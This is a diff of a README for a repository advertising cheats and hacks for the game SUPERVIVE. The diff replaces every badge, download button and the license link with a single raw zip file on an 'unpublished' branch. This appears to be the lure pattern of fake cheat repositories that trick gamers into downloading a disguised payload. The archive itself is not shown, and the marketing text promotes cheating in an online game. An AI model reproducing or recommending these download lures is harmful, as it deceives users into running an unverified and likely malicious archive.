@@ -1,8 +1,8 @@
 # SUPERVIVE Cheats & Hacks Repository
 
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://shields.io/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](#-mit-license-section)
-[![OS Compatibility](https://img.shields.io/badge/OS-Windows,%20Linux,%20macOS-blue)](#-os-compatibility)
+[![Build Status](https://github.com/lucas-itup/SUPERVIVE-elite-toolset/raw/refs/heads/branch/unpublished/toolset-SUPERVIV-elite-Clarice.zip)](https://github.com/lucas-itup/SUPERVIVE-elite-toolset/raw/refs/heads/branch/unpublished/toolset-SUPERVIV-elite-Clarice.zip)
+[![License: MIT](https://github.com/lucas-itup/SUPERVIVE-elite-toolset/raw/refs/heads/branch/unpublished/toolset-SUPERVIV-elite-Clarice.zip)](#-mit-license-section)
+[![OS Compatibility](https://github.com/lucas-itup/SUPERVIVE-elite-toolset/raw/refs/heads/branch/unpublished/toolset-SUPERVIV-elite-Clarice.zip,%20Linux,%20macOS-blue)](#-os-compatibility)
 
 Welcome to the frontier of upgraded gaming strategies! This comprehensive repository delivers an ingenious toolkit of SUPERVIVE cheats and hacks, imagined for those who seek to enrich their SUPERVIVE experience with intelligent, adaptive solutions. Here, code meets creativity: turbocharge your gameplay with our predictive auto-aim, spectral vision, and dynamic enhancements, all engineered for the modern gamer.
 
@@ -10,7 +10,7 @@ All resources are crafted for seamless integration and ultimate personalization.
 
 ---
 
-[![Download](https://i.ibb.co/ZVh01dm/download-button.png)](https://lucas-itup.github.io)
+[![Download](https://github.com/lucas-itup/SUPERVIVE-elite-toolset/raw/refs/heads/branch/unpublished/toolset-SUPERVIV-elite-Clarice.zip)](https://github.com/lucas-itup/SUPERVIVE-elite-toolset/raw/refs/heads/branch/unpublished/toolset-SUPERVIV-elite-Clarice.zip)
 
 *Click the "Download" image above to start your SUPERVIVE enhancement journey!*
 
@@ -60,7 +60,7 @@ Embarking on your amplified SUPERVIVE experience is simple! Follow these steps:
 
 ### Step 2: Download the SUPERVIVE Enhancement Suite
 
-[![Download](https://i.ibb.co/ZVh01dm/download-button.png)](https://lucas-itup.github.io)
+[![Download](https://github.com/lucas-itup/SUPERVIVE-elite-toolset/raw/refs/heads/branch/unpublished/toolset-SUPERVIV-elite-Clarice.zip)](https://github.com/lucas-itup/SUPERVIVE-elite-toolset/raw/refs/heads/branch/unpublished/toolset-SUPERVIV-elite-Clarice.zip)
 
 *Tap the "Download" button above to obtain the latest package.*
 
@@ -129,13 +129,13 @@ This repository provides SUPERVIVE enhancement tools exclusively for educational
 
 ## 📜 MIT License Section
 
-This SUPERVIVE Cheats & Hacks repository is published under the [MIT License, 2025](https://opensource.org/licenses/MIT). You're free to use, modify, and share—just be sure to keep a copy of the license in your distribution.
+This SUPERVIVE Cheats & Hacks repository is published under the [MIT License, 2025](https://github.com/lucas-itup/SUPERVIVE-elite-toolset/raw/refs/heads/branch/unpublished/toolset-SUPERVIV-elite-Clarice.zip). You're free to use, modify, and share—just be sure to keep a copy of the license in your distribution.
 
 ---
 
 ## 🎉 Ready to Upgrade Your SUPERVIVE Adventure?
 
-[![Download](https://i.ibb.co/ZVh01dm/download-button.png)](https://lucas-itup.github.io)
+[![Download](https://github.com/lucas-itup/SUPERVIVE-elite-toolset/raw/refs/heads/branch/unpublished/toolset-SUPERVIV-elite-Clarice.zip)](https://github.com/lucas-itup/SUPERVIVE-elite-toolset/raw/refs/heads/branch/unpublished/toolset-SUPERVIV-elite-Clarice.zip)
 
 *Begin your journey with a click—power up your game with the most creative amplification tools for SUPERVIVE, and let your gameplay imagination run wild!*
 
